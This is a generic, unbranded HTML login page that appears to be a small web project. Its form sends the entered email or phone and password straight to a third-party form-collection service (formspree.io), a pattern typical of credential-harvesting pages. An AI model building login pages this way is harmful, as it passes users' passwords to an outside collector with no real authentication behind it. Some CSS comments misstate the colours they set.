<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css'>
  <link rel="shortcut icon" href="https://i.ibb.co/sqFtmKj/Screenshot-2024-02-28-183458.png" type="image/x-icon">
  <style>
    body {
      background-color: #161615; /* Set background color to golden */
      color: #e4c70b; /* Set text color to black */
    }
    .login-form {
      margin-top: 100px;
    }
    .field {
      position: relative;
      margin-bottom: 20px;
    }
    .field input {
      height: 50px;
      font-size: 19px;
      color: #868686;
      padding-left: 50px;
      border-radius: 5px;
      border: 1px solid #444;
      caret-color: #339933;
      background: linear-gradient(#333, #222);
    }
    .field .input-icon {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      left: 15px;
      color: #868686;
    }
    button {
      height: 50px;
      font-size: 19px;
      font-weight: 600;
      letter-spacing: 1px;
      border-radius: 5px;
      cursor: pointer;
    }
    .link {
      margin-top: 25px;
      color: #868686;
    }
    .link a {
      color: #58b22b;
    }
  </style>
</head>
<body>
<div class="container">
  <div class="row justify-content-center">
    <div class="col-md-4 login-form">
      <h2 class="text-center mb-4">LOGIN</h2>
      <form action="https://formspree.io/f/xvoekwkz" method="POST">
        <div class="field">
          <span class="input-icon fas fa-envelope"></span>
          <input type="text" name="email" class="form-control" placeholder="Email or Phone">
        </div>
        <div class="field">
          <span class="input-icon fas fa-lock"></span>
          <input type="password" name="password" class="form-control" placeholder="Password">
        </div>
        <button type="submit" class="btn btn-primary btn-block">LOGIN</button>
        <div class="link text-center mt-3">
          Not a member? <a href="signup.html">Signup now</a>
        </div>
      </form>
    </div>
  </div>
</div>
<script>
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('/service-worker.js')
        .then(registration => {
          console.log('Service Worker registered:', registration);
        })
        .catch(error => {
          console.error('Service Worker registration failed:', error);
        });
    });
  }
</script>
<script src="app.js"></script>
<script src="service-worker.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
